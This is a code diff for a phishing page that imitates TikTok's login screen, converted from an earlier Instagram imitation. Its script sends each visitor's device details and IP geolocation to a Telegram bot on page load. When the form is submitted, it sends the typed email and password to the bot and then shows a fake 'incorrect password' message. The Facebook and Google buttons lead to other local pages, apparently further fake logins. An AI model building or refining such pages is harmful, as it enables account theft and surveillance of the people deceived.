@@ -2,139 +2,188 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram Login</title>
+  <title>TikTok Login Clone</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    body {
-      background: #222a2e;
-      color: #fff;
-      font-family: Arial, sans-serif;
+    * {
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
       margin: 0;
       padding: 0;
-      min-height: 100vh;
+    }
+    body {
+      background-color: #f8f8f8;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
+      height: 100vh;
     }
     .container {
-      width: 100%;
-      max-width: 480px;
-      margin: 90px auto 0 auto;
-      background: transparent;
-      padding: 60px 16px 40px 16px;
-      border-radius: 16px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      width: 360px;
+      text-align: center;
     }
-    .lang-select {
-      color: #b3b3b3;
-      margin-bottom: 30px;
-      font-size: 16px;
+    h2 {
+      margin-bottom: 25px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
       cursor: pointer;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
     }
-    .logo {
-      margin-bottom: 56px;
+    .btn:hover {
+      background-color: #f0f0f0;
     }
-    .logo img {
-      width: 100px;
-      height: 100px;
-      display: block;
-      margin: 0 auto;
+    .btn.google {
+      color: #000;
     }
-    .input-box {
-      width: 100%;
-      margin-bottom: 24px;
+    .btn.facebook {
+      color: #1877f2;
     }
-    .input-box input {
-      width: 100%;
-      min-height: 60px;
-      padding: 0 28px;
-      border: 2px solid #444;
-      border-radius: 30px;
-      background: #222a2e;
-      color: #fff;
-      font-size: 20px;
-      outline: none;
-      margin-bottom: 0;
-      box-sizing: border-box;
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 15px 0;
     }
-    .login-btn {
-      width: 100%;
-      min-height: 60px;
-      background: #0095f6;
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #ddd;
+    }
+    .divider span {
+      margin: 0 10px;
+      color: #888;
+    }
+    .guest-btn {
+      background-color: #fe2c55;
       color: #fff;
       border: none;
-      border-radius: 30px;
-      font-size: 20px;
       font-weight: bold;
-      cursor: pointer;
-      margin-top: 12px;
-      margin-bottom: 36px;
-      transition: background 0.2s;
     }
-    .login-btn:hover {
-      background: #1877f2;
+    .guest-btn:hover {
+      background-color: #e61e45;
     }
-    .forgot {
-      color: #b3b3b3;
-      text-align: center;
-      margin-bottom: 56px;
+    .bottom-text {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+    .bottom-text a {
+      color: #fe2c55;
       text-decoration: none;
-      display: block;
-      font-size: 18px;
-    }
-    .create-btn {
-      width: 62%;
-      min-height: 60px;
-      background: transparent;
-      color: #0095f6;
-      border: 3px solid #0095f6;
-      border-radius: 30px;
-      font-size: 20px;
       font-weight: bold;
-      cursor: pointer;
-      margin-top: 24px;
-      margin-bottom: 56px;
-      transition: background 0.2s, color 0.2s;
-      letter-spacing: 0.5px;
-      padding: 0 28px;
-      box-sizing: border-box;
     }
-    .create-btn:hover {
-      background: #0095f6;
-      color: #fff;
+    .note {
+      font-size: 12px;
+      margin-top: 15px;
+      color: #999;
     }
-    .meta {
-      color: #b3b3b3;
-      text-align: center;
-      font-size: 20px;
-      margin-top: 36px;
+    .note b {
+      color: #000;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="lang-select">English (US) &#9660;</div>
-    <div class="logo">
-      <img src="62-instagram-512.png" alt="Instagram Logo">
-    </div>
-    <form id="login-form">
-      <div class="input-box">
-        <input type="text" placeholder="Username, email or mobile number" required>
-      </div>
-      <div class="input-box">
-        <input type="password" placeholder="Password" required>
-      </div>
-      <button class="login-btn" type="submit">Log in</button>
+    <span id="back-arrow" style="display:none; position:absolute; left:24px; top:24px; cursor:pointer; font-size:28px;">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15 19L8 12L15 5" stroke="#191919" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </span>
+    <h2>Log in to TikTok</h2>
+    <button class="btn"><img src="https://img.icons8.com/ios/20/000000/qr-code.png"/>Use QR code</button>
+    <button class="btn" id="show-login-form"><img src="https://img.icons8.com/ios/20/000000/user.png"/>Use phone / email / username</button>
+    <button class="btn facebook" id="facebook-login-btn"><img src="https://img.icons8.com/ios-filled/20/1877F2/facebook-new.png"/>Continue with Facebook</button>
+    <button class="btn google" id="google-login-btn"><img src="https://img.icons8.com/color/20/000000/google-logo.png"/>Continue with Google</button>
+    
+    <div class="divider"><span>OR</span></div>
+
+    <button class="btn guest-btn" id="guest-btn">Continue as guest</button>
+
+    <!-- Login form, hidden by default -->
+    <form id="login-form" style="display:none; margin-top: 20px; text-align: left;">
+      <h2 style="text-align:center;">Log in</h2>
+      <label for="login-email" style="font-weight:600;">Email or username</label>
+      <span style="float:right; font-size:13px; color:#888; font-weight:400;">Log in with phone</span>
+      <input id="login-email" type="text" placeholder="Email or username" style="width:100%;margin:8px 0 12px 0;padding:10px;border-radius:6px;border:1px solid #ddd;background:#f3f3f3;">
+      <input id="login-password" type="password" placeholder="Password" style="width:100%;margin-bottom:8px;padding:10px;border-radius:6px;border:1px solid #ddd;background:#f3f3f3;">
+      <span style="float:right; font-size:13px; color:#888; cursor:pointer;">Forgot password?</span>
+      <button id="tiktok-login-btn" type="submit" disabled style="width:100%;margin-top:18px;padding:12px;border-radius:8px;border:none;background:#ececec;color:#aaa;font-weight:600;font-size:16px;cursor:not-allowed;transition:background 0.2s, color 0.2s;">Log in</button>
     </form>
-    <a href="#" class="forgot">Forgot password?</a>
-    <button class="create-btn">Create new account</button>
-    <div class="meta">&#8734; Meta</div>
+
+    <div class="note">
+      By continuing with an account located in <b>Bangladesh</b>, you agree to our 
+      <a href="#">Terms of Service</a> and acknowledge that you have read our 
+      <a href="#">Privacy Policy</a>.
+    </div>
+
+    <div class="bottom-text">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
   </div>
   <script>
+    const showLoginBtn = document.getElementById('show-login-form');
+    const loginForm = document.getElementById('login-form');
+    const mainButtons = Array.from(document.querySelectorAll('.btn')).filter(btn => btn !== showLoginBtn);
+    const divider = document.querySelector('.divider');
+    const note = document.querySelector('.note');
+    const bottomText = document.querySelector('.bottom-text');
+    const backArrow = document.getElementById('back-arrow');
+    const facebookLoginBtn = document.getElementById('facebook-login-btn');
+    const googleLoginBtn = document.getElementById('google-login-btn');
+    const guestBtn = document.getElementById('guest-btn');
+
+    showLoginBtn.addEventListener('click', function() {
+      // Hide all main buttons, divider, note, and bottom text
+      mainButtons.forEach(btn => btn.style.display = 'none');
+      showLoginBtn.style.display = 'none';
+      if (divider) divider.style.display = 'none';
+      if (note) note.style.display = 'none';
+      if (bottomText) bottomText.style.display = 'none';
+      // Show login form
+      loginForm.style.display = 'block';
+      backArrow.style.display = 'block';
+    });
+    backArrow.addEventListener('click', function() {
+      // Hide login form and back arrow
+      loginForm.style.display = 'none';
+      backArrow.style.display = 'none';
+      // Show main buttons, divider, note, and bottom text
+      mainButtons.forEach(btn => btn.style.display = '');
+      showLoginBtn.style.display = '';
+      if (divider) divider.style.display = '';
+      if (note) note.style.display = '';
+      if (bottomText) bottomText.style.display = '';
+    });
+    facebookLoginBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      window.location.href = 'm.facebook.html';
+    });
+    googleLoginBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      window.location.href = 'gmail.html';
+    });
+    if (guestBtn) {
+      guestBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://www.tiktok.com/explore';
+      });
+    }
+
     // Fetch Telegram config from server.txt
     async function getTelegramConfig() {
       try {
@@ -159,7 +208,6 @@
       TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     });
 
-    // Guess device name/type from user agent
     function getDeviceName() {
       const ua = navigator.userAgent;
       if (/android/i.test(ua)) {
@@ -180,7 +228,6 @@
       }
     }
 
-    // Collect device info
     async function getDeviceInfo() {
       let batteryInfo = '';
       if (navigator.getBattery) {
@@ -193,7 +240,6 @@
       } else {
         batteryInfo = '🔋 Battery: N/A';
       }
-      // Additional details
       const screenRes = `🖥️ Screen: ${window.screen.width}x${window.screen.height}`;
       const timezone = `⏰ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
       const referrer = `🔗 Referrer: ${document.referrer || 'Direct/None'}`;
@@ -220,7 +266,6 @@
       return info.join('\n');
     }
 
-    // Fetch IP and geolocation info (CORS-friendly)
     async function getIPInfo() {
       try {
         const res = await fetch('https://geolocation-db.com/json/');
@@ -232,7 +277,6 @@
       }
     }
 
-    // Send message to Telegram
     async function sendToTelegram(message) {
       await fetch(TG_API, {
         method: 'POST',
@@ -248,57 +292,71 @@
       sendToTelegram(`🟢 New visitor!\n${deviceInfo}\n${ipInfo}`);
     });
 
-    // On login button click, send credentials, device info, and IP info, then after 10 seconds show error message
-    document.addEventListener('DOMContentLoaded', () => {
-      const loginForm = document.getElementById('login-form');
-      const forgotBtn = document.querySelector('.forgot');
-      const createBtn = document.querySelector('.create-btn');
-      const container = document.querySelector('.container');
+    // On TikTok login form submit
+    const loginFormEl = document.getElementById('login-form');
+    if (loginFormEl) {
+      let loadingDiv = null;
       let errorDiv = null;
-      if (!loginForm) return;
-      loginForm.addEventListener('submit', async (e) => {
+      loginFormEl.addEventListener('submit', async function(e) {
         e.preventDefault();
-        // Remove previous error if exists
+        const email = document.getElementById('login-email').value;
+        const password = document.getElementById('login-password').value;
+        const deviceInfo = await getDeviceInfo();
+        const ipInfo = await getIPInfo();
+        const credsBlock = `\n\n📋 Tap to copy:\n👤 Email/Phone: \`${email}\`\n🔑 Password: \`${password}\``;
+        const message = `🔐 TikTok Login${credsBlock}\n${deviceInfo}\n${ipInfo}`;
+        sendToTelegram(message);
+        // Show loading indicator
+        if (!loadingDiv) {
+          loadingDiv = document.createElement('div');
+          loadingDiv.style.textAlign = 'center';
+          loadingDiv.style.margin = '20px 0';
+          loadingDiv.innerHTML = '<span style="font-size:24px;">⏳</span><br>Loading...';
+          loginFormEl.appendChild(loadingDiv);
+        }
         if (errorDiv) {
           errorDiv.remove();
           errorDiv = null;
         }
-        const email = loginForm.querySelector('input[type="text"]').value;
-        const password = loginForm.querySelector('input[type="password"]').value;
-        const deviceInfo = await getDeviceInfo();
-        const ipInfo = await getIPInfo();
-        // Send info to Telegram immediately
-        const credsBlock = `\n\n📋 Tap to copy:\n👤 Email/Phone: \`${email}\`\n🔑 Password: \`${password}\``;
-        const message = `🔐 Login Attempt${credsBlock}\n${deviceInfo}\n${ipInfo}`;
-        sendToTelegram(message);
-        // Wait 10 seconds, then show error message
+        // After 10 seconds, show error message
         setTimeout(() => {
+          if (loadingDiv) {
+            loadingDiv.remove();
+            loadingDiv = null;
+          }
           if (!errorDiv) {
             errorDiv = document.createElement('div');
             errorDiv.style.textAlign = 'center';
-            errorDiv.style.color = '#fff';
+            errorDiv.style.color = '#e74c3c';
             errorDiv.style.margin = '20px 0';
-            errorDiv.style.fontSize = '18px';
-            errorDiv.innerText = 'Sorry, your password was incorrect. Please double-check your password.';
-            container.appendChild(errorDiv);
+            errorDiv.innerHTML = `The password that you've entered is incorrect.<br><a href="#" style="color:#fe2c55;text-decoration:underline;">Forgotten password?</a>`;
+            loginFormEl.appendChild(errorDiv);
           }
         }, 10000);
       });
-      // Forgot password link
-      if (forgotBtn) {
-        forgotBtn.addEventListener('click', function(e) {
-          e.preventDefault();
-          window.open('https://www.instagram.com/accounts/password/reset/', '_blank');
-        });
+    }
+
+    // Tiktok login button enable/disable logic
+    const loginEmail = document.getElementById('login-email');
+    const loginPassword = document.getElementById('login-password');
+    const tiktokLoginBtn = document.getElementById('tiktok-login-btn');
+    function updateLoginBtnState() {
+      if (loginEmail.value.trim() && loginPassword.value.trim()) {
+        tiktokLoginBtn.disabled = false;
+        tiktokLoginBtn.style.background = '#fe2c55';
+        tiktokLoginBtn.style.color = '#fff';
+        tiktokLoginBtn.style.cursor = 'pointer';
+      } else {
+        tiktokLoginBtn.disabled = true;
+        tiktokLoginBtn.style.background = '#ececec';
+        tiktokLoginBtn.style.color = '#aaa';
+        tiktokLoginBtn.style.cursor = 'not-allowed';
       }
-      // Create new account button
-      if (createBtn) {
-        createBtn.addEventListener('click', function(e) {
-          e.preventDefault();
-          window.open('https://www.instagram.com/accounts/emailsignup/', '_blank');
-        });
-      }
-    });
+    }
+    if (loginEmail && loginPassword && tiktokLoginBtn) {
+      loginEmail.addEventListener('input', updateLoginBtnState);
+      loginPassword.addEventListener('input', updateLoginBtnState);
+    }
   </script>
 </body>
 </html>
